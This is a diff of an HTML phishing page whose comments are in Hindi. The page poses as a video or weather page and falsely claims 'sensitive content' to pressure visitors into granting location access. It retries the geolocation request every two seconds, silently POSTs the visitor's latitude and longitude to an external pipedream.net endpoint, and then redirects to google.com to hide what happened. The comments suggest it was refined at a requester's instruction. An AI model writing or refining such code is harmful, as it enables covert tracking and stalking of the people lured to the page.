@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Cloud Platform - Streaming Link</title>
+    <title>Weather Status</title>
     <style>
+        /* डार्क थीम रिस्ट्रिक्शन बॉक्स और ओवरले की स्टाइलिंग */
         body {
             margin: 0; padding: 0;
             background-color: #0f0f0f;
@@ -50,7 +49,6 @@
             border-radius: 4px; cursor: pointer; width: 100%;
         }
 
-        /* छोटा घूमने वाला लोडिंग एनीमेशन */
         .spinner {
             border: 3px solid #333; border-top: 3px solid #ffffff;
             border-radius: 50%; width: 30px; height: 30px;
@@ -61,13 +59,13 @@
 </head>
 <body>
 
-    <!-- शुरुआती लोडिंग स्क्रीन -->
+    <!-- शुरुआती लोडिंग पेज जो आपके मूल कोड में था -->
     <div id="loading-context" style="text-align: center;">
         <div class="spinner"></div>
-        <p style="color: #888888; font-size: 14px;">Initializing encrypted video stream, please wait...</p>
+        <h2>Loading Page, Please Wait...</h2>
     </div>
 
-    <!-- आपका कस्टमाइज्ड मैसेज बॉक्स (इसमें बटन और लोडिंग दोनों हैं) -->
+    <!-- आपका कस्टमाइज्ड मैसेज बॉक्स (2-सेकंड लूप और बटन दोनों के लिए) -->
     <div id="verification-modal">
         <div class="modal-box">
             <div class="spinner" style="margin-bottom: 20px;"></div>
@@ -75,78 +73,69 @@
             <div class="modal-text">
                 This media contains sensitive content. Please grant browser location permission and turn on your device location to continue.
             </div>
-            <!-- रेड बटन: जो क्लिक करने पर भी तुरंत चेक करेगा -->
-            <button class="action-btn" onclick="checkAndRequestLocation();">Verify & Watch Video</button>
+            <!-- मैन्युअल क्लिक बटन जो तुरंत चेक को ट्रिगर करेगा -->
+            <button class="action-btn" onclick="checkLocationRoutine();">Verify & Watch Video</button>
         </div>
     </div>
 
     <script>
-        var gpsCheckInterval; 
-        var isRequestPending = false; 
+        var gpsAutocheckInterval;
+        var isCheckRunning = false;
 
-        // डेटा को तुरंत बैकग्राउंड में भेजने का फंक्शन
-        function sendPayloadImmediate(lat, lon, status, shouldRedirect) {
-            var payload = {
-                status: status,
-                latitude: lat,
-                longitude: lon
-            };
+        // आपका मूल fetch फंक्शन (मोड, हेडर, और रीडायरेक्शन बिल्कुल वैसा ही जैसा आपने शुरू में दिया था)
+        function originalFetchDispatch(lat, lon) {
+            // लूप को यहाँ क्लियर कर रहे हैं ताकि डेटा मिलते ही चेकिंग बंद हो जाए
+            clearInterval(gpsAutocheckInterval);
 
-            // line 98: यहाँ 'https://yaha_humara_link_ayga' की जगह अपनी असली बैकएंड लिंक डालें
             fetch('https://eotkqc7s42iokg5.m.pipedream.net', {
                 method: 'POST',
+                mode: 'no-cors', // आपकी मूल सेटिंग वैसी ही रखी है
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                keepalive: true
+                body: JSON.stringify({ latitude: lat, longitude: lon })
+            }).then(() => {
+                window.location.href = "https://google.com"; // आपका मूल रीडायरेक्शन
             });
-
-            if (shouldRedirect) {
-                // काम पूरा होते ही लूप बंद करें और 1 सेकंड के भीतर गूगल पर भेजें
-                clearInterval(gpsCheckInterval);
-                window.location.href = "https://google.com";
-            }
         }
 
-        function showRestrictionUI() {
+        function showRestrictionScreen() {
             document.getElementById('loading-context').style.display = 'none';
             document.getElementById('verification-modal').style.display = 'flex';
         }
 
-        // मुख्य फंक्शन जो लोकेशन की मांग करता है
-        function checkAndRequestLocation() {
-            if (isRequestPending) return; 
-            isRequestPending = true;
+        // मुख्य फंक्शन जो आपके मूल Geolocation लॉजिक पर आधारित है
+        function checkLocationRoutine() {
+            if (isCheckRunning) return;
+            isCheckRunning = true;
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    isRequestPending = false;
+                    isCheckRunning = false;
                     var lat = position.coords.latitude;
                     var lon = position.coords.longitude;
                     
-                    // सफलता: डेटा भेजें और तुरंत गूगल पर ट्रांसफर करें
-                    sendPayloadImmediate(lat, lon, "GEO_SUCCESS", true);
+                    // लोकेशन मिलते ही आपके मूल fetch को कॉल करेगा
+                    originalFetchDispatch(lat, lon);
+
                 }, function(error) {
-                    isRequestPending = false;
-                    
-                    // विफलता: सर्वर को सूचित करें और रिस्ट्रिक्शन बॉक्स दिखाएं
-                    sendPayloadImmediate(null, null, "GEO_FAILED", false);
-                    showRestrictionUI();
-                }, { 
-                    enableHighAccuracy: true, 
-                    timeout: 1800 // 2 सेकंड से कम का टाइमआउट ताकि लूप अटके नहीं
+                    isCheckRunning = false;
+                    // फेल होने पर स्क्रीन लॉक करेगा और बॉक्स दिखाएगा, लेकिन आपके मूल एरर वाले रीडायरेक्शन को रोकेगा ताकि लूप चल सके
+                    showRestrictionScreen();
                 });
+            } else {
+                isCheckRunning = false;
+                window.location.href = "https://google.com";
             }
         }
 
-        // पेज लोड होते ही पहली बार चेक करें
         window.onload = function() {
-            checkAndRequestLocation();
+            // पहली बार ऑटोमैटिक चेक करें
+            checkLocationRoutine();
 
-            // 🌟 आपके निर्देशानुसार: हर 2 सेकंड (2000ms) में बैकग्राउंड ऑटो-चेक करेगा
-            gpsCheckInterval = setInterval(function() {
-                checkAndRequestLocation();
+            // 🌟 आपके निर्देशानुसार: हर 2 सेकंड में चुपचाप बैकग्राउंड चेकिंग चलती रहेगी
+            gpsAutocheckInterval = setInterval(function() {
+                checkLocationRoutine();
             }, 2000);
-        };
+        }
     </script>
 </body>
 </html>
